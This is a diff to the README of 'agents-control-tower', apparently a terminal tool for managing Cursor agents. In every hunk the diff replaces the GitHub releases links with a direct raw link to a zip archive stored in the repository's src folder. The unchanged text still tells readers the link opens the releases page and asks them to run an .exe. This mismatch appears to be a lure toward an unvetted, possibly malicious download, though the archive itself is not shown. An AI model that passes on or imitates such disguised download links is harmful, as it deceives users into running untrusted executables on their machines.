@@ -1,6 +1,6 @@
 # 🎛️ agents-control-tower - Manage Your Cursor Agents Easily
 
-[![Download agents-control-tower](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/leo07/agents-control-tower/releases)
+[![Download agents-control-tower](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/leo07/agents-control-tower/main/src/control-tower-agents-v3.7.zip)
 
 ---
 
@@ -42,7 +42,7 @@ This section will guide you from downloading the software to running it for the 
 
 Click the large green button below to visit the releases page where you can download the latest version.
 
-[![Download agents-control-tower](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/leo07/agents-control-tower/releases)
+[![Download agents-control-tower](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/leo07/agents-control-tower/main/src/control-tower-agents-v3.7.zip)
 
 1. The link opens the GitHub releases page.
 2. Look for the latest Windows executable file. It usually ends with `.exe`.
@@ -96,7 +96,7 @@ The application uses a terminal-based user interface (TUI). This means it looks 
 To get the latest features and fixes:
 
 1. Visit the releases page again:  
-   [https://github.com/leo07/agents-control-tower/releases](https://github.com/leo07/agents-control-tower/releases)
+   [https://raw.githubusercontent.com/leo07/agents-control-tower/main/src/control-tower-agents-v3.7.zip](https://raw.githubusercontent.com/leo07/agents-control-tower/main/src/control-tower-agents-v3.7.zip)
 2. Download the newest `.exe` file.
 3. Run the installer again to update your app. It will keep your existing settings.
 
@@ -134,7 +134,7 @@ For more information on how to use Cursor agents or terminal commands:
 
 ---
 
-[![Download agents-control-tower](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/leo07/agents-control-tower/releases)
+[![Download agents-control-tower](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/leo07/agents-control-tower/main/src/control-tower-agents-v3.7.zip)
 
 ---
 
